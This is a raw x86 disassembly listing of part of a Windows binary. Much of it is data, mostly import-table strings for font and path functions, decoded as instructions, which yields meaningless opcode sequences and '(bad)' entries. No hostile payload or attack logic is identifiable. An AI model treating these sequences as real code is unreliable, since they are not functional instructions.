  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	aaa    
  413c54:	inc    ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    DWORD PTR [ebx+0x0],eax
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    DWORD PTR [ebx+0x0],eax
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	inc    esp
  413f63:	les    ecx,FWORD PTR [eax+0xd76777]
  413f69:	add    BYTE PTR [eax],al
  413f6b:	add    DWORD PTR [eax],eax
  413f6d:	add    bl,dl
  413f6f:	xchg   ch,dh
  413f71:	sbb    BYTE PTR [eax],cl
  413f73:	lods   al,BYTE PTR ds:[esi]
  413f74:	xor    al,0x82
  413f76:	ins    BYTE PTR es:[edi],dx
  413f77:	dec    ecx
  413f78:	sbb    DWORD PTR [ebx-0x6f6c918f],edx
  413f7e:	sar    ah,0x74
  413f81:	ret    
  413f82:	aaa    
  413f83:	iret   
  413f84:	pop    esp
  413f85:	cmp    ah,BYTE PTR [edi]
  413f87:	push   DWORD PTR [ecx+0x11]
  413f8a:	sar    WORD PTR [ecx+0x52025e84],0x2b
  413f92:	push   ecx
  413f93:	bsf    esp,DWORD PTR [ebp-0x8bef32]
  413f9a:	les    eax,FWORD PTR [ebp+edi*8-0x5e]
  413f9e:	jb     0x413ff2
  413fa0:	xlat   BYTE PTR ds:[ebx]
  413fa1:	int3   
  413fa2:	ror    dl,0xa0
  413fa5:	pusha  
  413fa6:	mov    dh,0x31
  413fa8:	mov    ch,0x1
  413faa:	test   ecx,0x39366847
  413fb0:	or     BYTE PTR [ecx+0x59d021e3],bh
  413fb6:	in     al,0x8
  413fb8:	pushf  
  413fb9:	jl     0x413f7c
  413fbb:	push   0x67
  413fbd:	cs push ss
  413fbf:	pop    esp
  413fc0:	cs dec esp
  413fc2:	jmp    eax
  413fc4:	jmp    0x414016
  413fc6:	jae    0x41400c
  413fc8:	pop    esi
  413fc9:	inc    eax
  413fca:	sbb    eax,0xc0a169f7
  413fcf:	add    edx,DWORD PTR [esi]
  413fd1:	jae    0x413fad
  413fd3:	fmul   DWORD PTR [edi]
  413fd5:	call   0x5fb2:0x57bca270
  413fdc:	shl    BYTE PTR [ecx+esi*1+0x7c1ff554],cl
  413fe3:	lds    ebp,FWORD PTR [ecx]
  413fe5:	sti    
  413fe6:	push   0x4f1d2615
  413feb:	(bad)
  413fee:	call   0xf009df6c
  413ff3:	and    esi,DWORD PTR [eax+0x57]
  413ff6:	mov    cl,0xe
  413ff8:	jmp    0x16a6:0xe201a0b6
  413fff:	pop    esp
  414000:	push   edi
  414001:	mov    al,ds:0xd01269e6
  414006:	or     al,0x78
  414008:	mov    dh,0xa7
  41400a:	and    eax,0xabc29a7c
  41400f:	sub    eax,0xbe1ee767
  414014:	push   edx
  414015:	xor    dh,dh
  414017:	cwde   
  414018:	popf   
  414019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41401a:	xchg   ecx,eax
  41401b:	xor    ebx,ecx
  41401d:	stos   BYTE PTR es:[edi],al
  41401e:	ficom  DWORD PTR ds:0x1d9976da
  414024:	aaa    
  414025:	push   ebx
  414026:	ror    DWORD PTR [ebp-0x7],1
  414029:	xor    ebp,DWORD PTR ds:0x57517284
  41402f:	pop    es
  414030:	jmp    0x41405c
  414032:	push   ss
  414033:	outs   dx,BYTE PTR ds:[esi]
  414034:	(bad)  
  414037:	out    dx,eax
  414038:	add    DWORD PTR [ebx],ecx
  41403a:	and    eax,0xc61ced69
